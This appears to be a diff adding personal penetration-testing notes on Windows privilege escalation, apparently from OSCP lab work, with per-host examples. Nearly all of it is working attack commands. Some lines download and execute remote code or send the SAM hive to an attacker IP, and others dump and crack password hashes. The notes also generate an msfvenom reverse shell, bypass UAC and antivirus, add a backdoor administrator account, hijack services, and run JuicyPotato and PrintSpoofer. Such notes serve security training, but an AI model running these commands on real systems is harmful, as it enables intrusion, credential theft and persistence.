@@ -1,0 +1,214 @@
+# Enumeration
+1) whoami /priv
+2) whoami /groups
+3) winPEAS
+4) accesschk
+5) icacls
+
+# Privilege Escalation
+https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
+
+
+# Powershell
+powershell -noexit "& "".\<file>"""
+# execute directly over web
+powershell.exe -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/user_enum.txt');"
+
+# Crack passwords
+# Copy pw files back
+reg save hklm\sam .\sam
+reg save hklm\system .\system
+reg save hklm\security .\security
+# Dump passwords		# only copy hash lines to passwords.txt
+/usr/local/bin/secretsdump.py -system system -security security -sam sam LOCAL
+# Crack passwords
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT passwords.txt
+hashcat --potfile-disable --quiet -m 1000 -a 0 passwords.txt /usr/share/wordlists/rockyou.txt
+# Run on target to dump passwords
+PwDump.exe localhost > password.txt
+
+# File transfer
+sudo /usr/local/bin/smbserver.py juju .
+sudo /usr/local/bin/smbserver.py -smb2support juju .
+sudo impacket-smbserver juju .
+powershell -c iex "(New-Object Net.WebClient).DownloadFile('http://192.168.119.206:8000/MS14-070.exe', 'MS14-070.exe')" 2>&1
+powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.119.206/upload.php','.\sam')"
+certutil.exe -urlcache -split -f "http://192.168.119.206/shell.exe" shell.exe
+
+# Upload
+#save at /var/www/html/upload.php
+<?php
+$uploaddir = '/var/www/uploads/';
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+# upload with powershell
+powershell.exe -c (New-Object System.Net.WebClient).uploadFile('http://<ip>/upload.php', '<source file>')
+# if some files don't upload, make sure php.ini allows for large file uploads
+find / -iname php.ini 2>/dev/null
+sudo gedit /etc/php/7.4/apache2/php.ini
+sudo gedit /etc/php/8.1/apache2/php.ini
+memory_limit = -1
+upload_max_filesize = 10G
+post_max_size = 0
+max_execution_time = 120
+
+
+# check seimpersonateprivilege
+whoami /priv
+
+# find files
+dir proof.txt /S /P
+dir C:\Users\ralph\ /s /a /b | findstr "ps1"
+
+get-executionpolicy -scope currentuser
+set-executionpolicy -executionpolicy unrestricted -scope currentuser
+
+#Check service permissions
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+accesschk.exe /accepteula -ucqv SSDPSRV
+
+# Service Escalation
+sc create juju binpath="\\192.168.119.206\myhome\shell.exe" type=own type=interact
+sc start juju
+
+# UAC
+# 10.1.1.224 NICKY
+whoami /groups
+net localgroup administrators
+sigcheck64.exe -accepteula -a -m C:\Windows\WinSxS\amd64_microsoft-windows-fodhelper-ux_31bf3856ad364e35_10.0.14393.0_none_6063d58c87020b06\fodhelper.exe
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+# EnableLUA set to 1 and ConsentPromptBehaviorAdmin set to 5 means UAC is enabled
+https://github.com/rootm0s/WinPwnage
+
+REG QUERY HKCU\Software\Classes\mscfile\shell\open\command
+REG QUERY HKCR\mscfile\shell\open\command
+REG ADD "HKCU\Software\Classes\mscfile\shell\open\command" /t REG_SZ /d "%TEMP%\shell.exe"
+REG QUERY HKCU\Software\Classes\mscfile\shell\open\command
+eventvwr.exe
+
+# Antivirus
+https://www.ired.team/offensive-security/defense-evasion/av-bypass-with-metasploit-templates
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.200 LPORT=443 -f c -b \x00\x0a\x0d
+x86_64-w64-mingw32-gcc antivirus_shell.cpp -o mys.exe
+
+# Compile
+i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
+
+# Remote desktop user
+https://operating-systems.wonderhowto.com/how-to/create-admin-user-account-using-cmd-prompt-windows-0125689/
+https://www.top-password.com/blog/add-user-to-remote-desktop-users-group-in-windows-10/
+cmd /c net user /add juju password
+cmd /c net localgroup administrators juju /add
+cmd /c net localgroup "Remote Desktop Users" juju /add
+
+# Services
+# run icacls (cacls on XP and lower) to see if we have write permissions
+https://www.exploit-db.com/exploits/40071
+# 10.2.2.22 Carol
+type C:\Program Files (x86)\hide.me VPN\service.settings
+{"UserSpecific":[{"User":"CAROL\\Administrator","AppDataFolder":"C:\\Users\\Administrator\\AppData\\Roaming\\Hide.me"}]}
+# The service is running as local administrator.  Run icacls to see if we have write permissions to the folder.
+icacls "C:\Program Files (x86)\hide.me VPN"
+	Everyone:(OI)(CI)(M)
+# If everyone has the "modify" permission, we can write to it.  Find the service
+wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows"
+hide.me VPN Service	hmevpnsvc	"C:\Program Files (x86)\hide.me VPN\vpnsvc.exe"
+# The service name is hmevpnsvc.  Query to get info
+sc query hmevpnsvc
+	STATE	: 4 RUNNING
+# Service is running, try stoping the service,  If that doesn't work,  break the service (by modifying the DLLs in this case), then rewrite the file C:\Program Files (x86)\hide.me VPN\vpnsvc.exe and start the service by rebooting.
+
+
+# Unquoted Service Path
+# 10.2.2.86 JOHN
+# List services
+wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows"
+Iperius Remote Service		IperiusRemoteSvc		C:\Program Files\Iperius\Iperius Remote\IperiusRemote.exe
+# If any have unquoted paths and spaces, check if writable
+icacls "C:\Program Files\Imperius
+	BUILTIN\Users:(OI)(CI)(W)
+# BUILTIN\Users can write.  Check how the service is run
+sc qc ImperiusRemoteSvc
+	START_TYPE	: 2	AUTO_START
+# must be rebooted to start service.  Copy the executable to "C:\Program Files\Iperius\Iperius.exe"
+	
+
+# Kernel
+# run to get list of kernel exploits for target
+~/OSCP-labs/notes/windows/Windows-Exploit-Suggester/windows-exploit-suggester.py -d ~/tools/Windows-Exploit-Suggester/2021-01-06-mssb.xls -i systeminfo.txt
+# If we can't run systeminfo, get windows version from registry
+# 10.1.1.235 NINA
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion"
+~/OSCP-labs/notes/windows/Windows-Exploit-Suggester/windows-exploit-suggester.py -d ~/tools/Windows-Exploit-Suggester/2021-01-06-mssb.xls -o "windows vista service pack 1"
+# collection of compiled windows exploits
+https://github.com/SecWiki/windows-kernel-exploits
+
+
+# Exploits
+# Juicy Potato
+https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505
+http://ohpe.it/juicy-potato/
+https://github.com/ohpe/juicy-potato
+# Check permissions
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+# 10.11.1.13 DISCO
+C:\Windows\Temp>JuicyPotato.exe -t * -p C:\Windows\Temp\shell.exe -l 1337
+# 10.11.1.31 RALPH
+C:\windows\temp\JuicyPotato.exe -t * -p C:\windows\temp\admin_shell.exe -l 1337 -c {7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}
+
+# PrintSpoofer
+# Use if SeImpersonatePrivilege is enabled and widows 10 version is greater than 1803
+https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
+https://github.com/itm4n/PrintSpoofer
+# 10.1.1.68 CHIMERA
+PrintSpoofer64.exe -c "C:\Users\steph\AppData\Local\Temp\shell2.exe"
+
+# Windows services
+# Privilege escalation on windows running XP SP0/SP1
+https://sohvaxus.github.io/content/winxp-sp1-privesc.html
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+RW SSDPSRV
+        SERVICE_ALL_ACCESS
+RW upnphost
+        SERVICE_ALL_ACCESS
+# 10.11.1.14 BOB
+C:\Inetpub>sc qc upnphost
+SERVICE_NAME: upnphost
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
+        LOAD_ORDER_GROUP   :   
+        TAG                : 0  
+        DISPLAY_NAME       : Universal Plug and Play Device Host  
+        DEPENDENCIES       : SSDPSRV  
+        SERVICE_START_NAME : NT AUTHORITY\LocalService  
+C:\Inetpub>sc qc SSDPSRV
+SERVICE_NAME: SSDPSRV
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 4   DISABLED
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
+        LOAD_ORDER_GROUP   :   
+        TAG                : 0  
+        DISPLAY_NAME       : SSDP Discovery Service  
+        DEPENDENCIES       :   
+        SERVICE_START_NAME : NT AUTHORITY\LocalService
+        
+# ExacqVision        
+# 10.1.1.89 DESKTOP-MVUAOO7
+# vulnerable to https://www.exploit-db.com/exploits/46370
+
+# Remotemouse
+# 10.1.1.89 DESKTOP-MVUAOO7
+# vulnerable to https://github.com/p0dalirius/RemoteMouse-3.008-Exploit
+sudo proxychains4 -q python3 RemoteMouse-3.008-Exploit.py -t 10.1.1.89 -v
